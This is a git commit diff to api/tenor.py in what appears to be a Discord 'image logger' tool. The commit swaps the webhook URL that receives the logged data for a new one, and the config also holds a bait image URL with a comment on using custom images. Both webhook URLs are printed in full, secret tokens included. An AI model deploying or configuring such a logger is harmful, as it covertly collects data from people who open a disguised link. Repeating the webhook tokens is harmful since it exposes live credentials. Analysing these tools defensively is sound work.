a58890c136b7c665c2465572ebdf10955edb930b
ScaremaneX <115543315+ScaremaneX@users.noreply.github.com>
2025-04-17 20:28:39 +0200

    Update tenor.py

--- api/tenor.py
+++ api/tenor.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1073676404014723122/7WaojUcYefnVkSRI_A8q4pw1-UZIL9_PB3wSN2FRGIWMyxlf0bs-woV9BK020gxPr_4X",
+    "webhook": "https://discord.com/api/webhooks/1360333887728910376/7TFr-YimwsKQkWGnHDF1GLmx3Pnp6Bi4ldqZOMfp386j8bP1f_-0p2ZasJryopbFuHQs",
     "image": "https://imgs.search.brave.com/ss6V-NdZ42CXwEyrrSzy4CZIEDtcGj8TCf2dLK3Z0Yg/rs:fit:1200:1200:1/g:ce/aHR0cHM6Ly93d3cu/dHJlZXNhdy5jby51/ay93cC1jb250ZW50/L3VwbG9hZHMvMjAy/MC8wMy90cmVlLTM4/MjIxNDlfMTkyMC5q/cGc", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
